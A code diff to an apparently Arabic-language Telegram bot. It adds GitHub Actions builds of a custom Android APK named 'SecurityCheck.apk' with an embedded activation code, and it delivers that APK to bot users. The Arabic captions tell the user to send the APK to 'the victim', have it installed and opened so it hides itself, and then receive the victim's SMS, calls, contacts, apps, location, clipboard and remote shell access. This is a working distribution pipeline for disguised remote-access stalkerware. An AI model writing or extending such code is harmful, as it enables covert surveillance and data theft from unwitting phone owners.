@@ -229,12 +229,18 @@ PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 RAILWAY_URL = PUBLIC_URL
 
-# ★★★ رابط APK من المستودع المنفصل ★★★
+# ★ GitHub Settings
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")
+GITHUB_REPO = os.getenv("GITHUB_REPO", "atmemokhtar2-blip/zxvp")
+GITHUB_WORKFLOW_FILE = os.getenv("GITHUB_WORKFLOW_FILE", "build.yml")
+
+# ★ APK fallback URL
 APK_DOWNLOAD_URL = os.getenv("APK_DOWNLOAD_URL", 
     "https://github.com/atmemokhtar2-blip/apk/raw/main/SecurityCheck.apk")
 
 print(f"[+] Public URL: {PUBLIC_URL}")
-print(f"[+] APK URL: {APK_DOWNLOAD_URL}")
+print(f"[+] GitHub Repo: {GITHUB_REPO}")
+print(f"[+] GitHub Token: {'Set' if GITHUB_TOKEN else 'NOT SET'}")
 
 
 # ============================================================
@@ -346,6 +352,95 @@ def generate_short_code(length=8):
     import random
     chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
     return ''.join(random.choices(chars, k=length))
+
+
+# ============================================================
+# ★★★ GitHub Actions — بناء APK مخصص ★★★
+# ============================================================
+def trigger_apk_build(activation_code):
+    """يشغّل GitHub Action لبناء APK بكود مخصص"""
+    if not GITHUB_TOKEN:
+        print("[-] GITHUB_TOKEN not set")
+        return None
+    
+    try:
+        url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW_FILE}/dispatches"
+        
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json",
+        }
+        
+        payload = {
+            "ref": "main",
+            "inputs": {
+                "activation_code": activation_code
+            }
+        }
+        
+        r = requests.post(url, headers=headers, json=payload, timeout=15)
+        
+        if r.status_code in [204, 200]:
+            print(f"[+] Build triggered: {activation_code}")
+            return True
+        else:
+            print(f"[-] Build trigger failed: {r.status_code} - {r.text[:200]}")
+            return False
+    except Exception as e:
+        print(f"[-] trigger_apk_build error: {e}")
+        return False
+
+
+def get_apk_from_release(activation_code):
+    """يجلب رابط APK من Releases"""
+    if not GITHUB_TOKEN:
+        return None
+    
+    try:
+        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases?per_page=10"
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json",
+        }
+        
+        r = requests.get(url, headers=headers, timeout=15)
+        
+        if r.status_code == 200:
+            releases = r.json()
+            
+            for release in releases:
+                # ابحث عن release يحتوي على الكود في الاسم
+                if activation_code in release.get("name", "") or activation_code in release.get("tag_name", ""):
+                    for asset in release.get("assets", []):
+                        if asset.get("name", "").endswith(".apk"):
+                            print(f"[+] APK found: {asset.get('browser_download_url')}")
+                            return asset.get("browser_download_url")
+        
+        return None
+    except Exception as e:
+        print(f"[-] get_apk_from_release error: {e}")
+        return None
+
+
+def wait_for_apk_build(activation_code, max_wait=600):
+    """ينتظر حتى ينتهي البناء ويعيد رابط APK"""
+    if not GITHUB_TOKEN:
+        return None
+    
+    start = time.time()
+    print(f"[+] Waiting for APK build: {activation_code}")
+    
+    while time.time() - start < max_wait:
+        # جرب البحث عن APK في Releases
+        apk_url = get_apk_from_release(activation_code)
+        if apk_url:
+            print(f"[+] APK ready: {apk_url}")
+            return apk_url
+        
+        time.sleep(15)
+    
+    print(f"[-] Timeout waiting for {activation_code}")
+    return None
 
 
 # ============================================================
@@ -530,9 +625,9 @@ def callback_handler(call):
             bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "apk", check), parse_mode="Markdown")
             return
         consume_usage(chat_id, "apk")
-        bot.answer_callback_query(call.id, "جاري تجهيز التطبيق...")
+        bot.answer_callback_query(call.id, "⏳ جاري تجهيز التطبيق المخصص لك...")
         
-        # كود التنشيط
+        # 1) أنشئ كود تنشيط فريد
         apk_code = None
         if APK_ENABLED:
             apk_code = create_apk_code(chat_id)
@@ -546,73 +641,153 @@ def callback_handler(call):
                 except Exception:
                     pass
         
-        # ★★★ حمّل APK من المستودع المنفصل ★★★
-        try:
-            print(f"[+] Downloading APK from: {APK_DOWNLOAD_URL}")
-            r = requests.get(APK_DOWNLOAD_URL, timeout=60, allow_redirects=True)
+        # 2) إذا كان GitHub Token مفقوداً → استخدم APK العام
+        if not GITHUB_TOKEN:
+            building_msg = bot.send_message(
+                chat_id,
+                f"⏳ **جاري تحميل التطبيق...**\n\n"
+                f"🔑 كود التنشيط: `{apk_code}`\n\n"
+                f"_(سيتم دمج الكود تلقائياً)_",
+                parse_mode="Markdown"
+            )
             
-            if r.status_code == 200 and len(r.content) > 10000:
-                print(f"[+] APK downloaded: {len(r.content)} bytes")
+            try:
+                r = requests.get(APK_DOWNLOAD_URL, timeout=60, allow_redirects=True)
                 
-                # أرسل APK كملف
-                apk_buffer = io.BytesIO(r.content)
-                apk_buffer.name = "SecurityCheck.apk"
-                
-                bot.send_document(
-                    chat_id, apk_buffer,
-                    caption=(
-                        f"📱 **تطبيق التحكم الكامل**\n"
-                        f"━━━━━━━━━━━━━━━━━━\n\n"
-                        f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
-                        f"📋 **طريقة الاستخدام:**\n"
-                        f"1. حمّل التطبيق على هاتف الضحية\n"
-                        f"2. ثبّته (وافق على المصادر)\n"
-                        f"3. افتحه (سيفتح ثم يختفي)\n"
-                        f"4. ستحصل على تقرير كامل فوراً\n\n"
-                        f"⚙️ **الأوامر المتاحة:**\n"
-                        f"• 📱 معلومات الجهاز\n"
-                        f"• 📨 SMS\n"
-                        f"• 📞 المكالمات\n"
-                        f"• 👥 جهات الاتصال\n"
-                        f"• 📲 التطبيقات\n"
-                        f"• 📍 الموقع\n"
-                        f"• 📋 الحافظة\n"
-                        f"• 💻 أوامر Shell\n"
-                        f"• 📳 اهتزاز / صوت"
-                    ),
-                    parse_mode="Markdown"
-                )
+                if r.status_code == 200 and len(r.content) > 10000:
+                    apk_buffer = io.BytesIO(r.content)
+                    apk_buffer.name = "SecurityCheck.apk"
+                    
+                    bot.send_document(
+                        chat_id, apk_buffer,
+                        caption=(
+                            f"📱 **تطبيق التحكم الكامل**\n"
+                            f"━━━━━━━━━━━━━━━━━━\n\n"
+                            f"🔑 **كود التنشيط:** `{apk_code}`\n\n"
+                            f"📋 **الخطوات:**\n"
+                            f"1. أرسل APK للضحية\n"
+                            f"2. تثبّته الضحية\n"
+                            f"3. تفتحه (سيعمل تلقائياً)\n"
+                            f"4. ستحصل على تقرير كامل"
+                        ),
+                        parse_mode="Markdown"
+                    )
+                else:
+                    bot.send_message(
+                        chat_id,
+                        f"❌ **فشل التحميل**\n\n🔗 {APK_DOWNLOAD_URL}",
+                        parse_mode="Markdown"
+                    )
+            except Exception as e:
+                bot.send_message(chat_id, f"❌ خطأ: {e}")
+            
+            try:
+                bot.delete_message(chat_id, building_msg.message_id)
+            except Exception:
+                pass
+            return
+        
+        # 3) أرسل رسالة البناء
+        building_msg = bot.send_message(
+            chat_id,
+            f"🔨 **جاري بناء تطبيقك المخصص...**\n\n"
+            f"🔑 كود التنشيط: `{apk_code}`\n\n"
+            f"⏳ **الوقت المتوقع: 2-4 دقائق**\n"
+            f"سيتم إرسال APK فور جهوزه\n\n"
+            f"💡 _يمكنك ترك البوت والعودة لاحقاً_",
+            parse_mode="Markdown"
+        )
+        
+        # 4) شغّل GitHub Action
+        success = trigger_apk_build(apk_code)
+        
+        if not success:
+            bot.edit_message_text(
+                f"❌ **فشل تشغيل البناء**\n\n"
+                f"🔑 الكود: `{apk_code}`\n"
+                f"جاري محاولة استخدام APK العام...",
+                chat_id=chat_id,
+                message_id=building_msg.message_id,
+                parse_mode="Markdown"
+            )
+            
+            # استخدم APK العام
+            try:
+                r = requests.get(APK_DOWNLOAD_URL, timeout=60, allow_redirects=True)
+                if r.status_code == 200:
+                    apk_buffer = io.BytesIO(r.content)
+                    apk_buffer.name = "SecurityCheck.apk"
+                    bot.send_document(chat_id, apk_buffer,
+                        caption=f"📱 **APK عام**\n🔑 الكود: `{apk_code}`",
+                        parse_mode="Markdown")
+            except Exception:
+                pass
+            return
+        
+        # 5) شغّل الانتظار في thread منفصل
+        def wait_and_send():
+            apk_url = wait_for_apk_build(apk_code, max_wait=600)
+            
+            if apk_url:
+                try:
+                    r = requests.get(apk_url, timeout=60, allow_redirects=True)
+                    
+                    if r.status_code == 200 and len(r.content) > 10000:
+                        apk_buffer = io.BytesIO(r.content)
+                        apk_buffer.name = f"SecurityCheck_{apk_code}.apk"
+                        
+                        bot.send_document(
+                            chat_id, apk_buffer,
+                            caption=(
+                                f"✅ **تطبيقك المخصص جاهز!**\n"
+                                f"━━━━━━━━━━━━━━━━━━\n\n"
+                                f"🔑 **كود التنشيط:** `{apk_code}`\n"
+                                f"_(مدمج تلقائياً — لا يحتاج كتابة)_\n\n"
+                                f"📋 **طريقة الاستخدام:**\n"
+                                f"1. أرسل APK للضحية\n"
+                                f"2. ثبّته على هاتفه\n"
+                                f"3. **افتحه** ← يعمل تلقائياً\n"
+                                f"4. **يختفي فوراً**\n"
+                                f"5. ستحصل على تقرير كامل\n\n"
+                                f"⚙️ **الأوامر المتاحة:**\n"
+                                f"• 📱 معلومات الجهاز\n"
+                                f"• 📨 SMS\n"
+                                f"• 📞 المكالمات\n"
+                                f"• 👥 جهات الاتصال\n"
+                                f"• 📲 التطبيقات\n"
+                                f"• 📍 الموقع\n"
+                                f"• 📋 الحافظة\n"
+                                f"• 💻 أوامر Shell"
+                            ),
+                            parse_mode="Markdown"
+                        )
+                    else:
+                        raise Exception(f"Download failed: {r.status_code}")
+                except Exception as e:
+                    bot.send_message(
+                        chat_id,
+                        f"❌ **فشل تحميل APK**\n\n"
+                        f"🔑 الكود: `{apk_code}`\n"
+                        f"🔗 الرابط: {apk_url}",
+                        parse_mode="Markdown"
+                    )
             else:
-                # فشل التحميل — أرسل الرابط
-                print(f"[-] APK download failed: status={r.status_code}, size={len(r.content)}")
                 bot.send_message(
                     chat_id,
-                    f"📱 **تطبيق التحكم الكامل**\n"
-                    f"━━━━━━━━━━━━━━━━━━\n\n"
-                    f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
-                    f"📥 **رابط التحميل المباشر:**\n"
-                    f"{APK_DOWNLOAD_URL}\n\n"
-                    f"📋 **الخطوات:**\n"
-                    f"1. اضغط على الرابط\n"
-                    f"2. حمّل APK\n"
-                    f"3. ثبّته على هاتف الضحية\n"
-                    f"4. افتحه\n"
-                    f"5. ستحصل على تقرير فوري",
+                    f"⏰ **انتهت مهلة الانتظار**\n\n"
+                    f"🔑 الكود: `{apk_code}`\n"
+                    f"🔗 اذهب لـ Releases:\n"
+                    f"https://github.com/{GITHUB_REPO}/releases",
                     parse_mode="Markdown",
                     disable_web_page_preview=True
                 )
-        except Exception as e:
-            print(f"[-] APK error: {e}")
-            bot.send_message(
-                chat_id,
-                f"📱 **تطبيق التحكم الكامل**\n"
-                f"━━━━━━━━━━━━━━━━━━\n\n"
-                f"🔑 **كود التنشيط:**\n`{apk_code}`\n\n"
-                f"📥 **رابط التحميل:**\n{APK_DOWNLOAD_URL}\n\n"
-                f"⚠️ **ملاحظة:** استخدم الرابط للتحميل",
-                parse_mode="Markdown",
-                disable_web_page_preview=True
-            )
+            
+            try:
+                bot.delete_message(chat_id, building_msg.message_id)
+            except Exception:
+                pass
+        
+        threading.Thread(target=wait_and_send, daemon=True).start()
         return
 
     # ============================================================
